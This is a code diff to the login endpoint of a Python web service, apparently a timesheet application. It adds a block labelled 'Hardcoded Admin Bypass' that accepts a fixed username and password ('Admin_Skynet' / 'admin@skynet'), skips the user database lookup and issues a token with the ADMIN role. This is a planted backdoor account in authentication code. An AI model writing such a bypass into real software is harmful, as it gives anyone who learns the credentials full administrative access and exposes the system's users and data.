@@ -21,9 +21,31 @@ async def register():
 async def login(credentials: UserLogin):
     users_collection = get_timesheet_users_collection()
 
-    # ── Look up user by employeeId (sent as 'email' field for backward compat) ──
+    # ── Normalize employeeId ──
     employee_id = credentials.email.strip()
     logger.info("Login attempt for employeeId=%s (claimed: %s)", employee_id, credentials.login_as)
+
+    # ── Hardcoded Admin Bypass ──
+    if employee_id == "Admin_Skynet" and credentials.password == "admin@skynet":
+        logger.info("Hardcoded admin login successful for Admin_Skynet")
+        access_token_expires = timedelta(minutes=settings.access_token_expire_minutes)
+        payload_data = {
+            "sub": "Admin_Skynet",
+            "user_id": "Admin_Skynet",
+            "username": "SkyNet Master Admin",
+            "role": "ADMIN",
+            "team_lead": "SYSTEM",
+        }
+        access_token = create_access_token(data=payload_data, expires_delta=access_token_expires)
+        return {
+            "access_token": access_token,
+            "token_type": "bearer",
+            "user": {
+                "email": "Admin_Skynet",
+                "full_name": "SkyNet Master Admin",
+                "role": "ADMIN"
+            }
+        }
 
     user = await users_collection.find_one({"employeeId": employee_id})
     if not user:
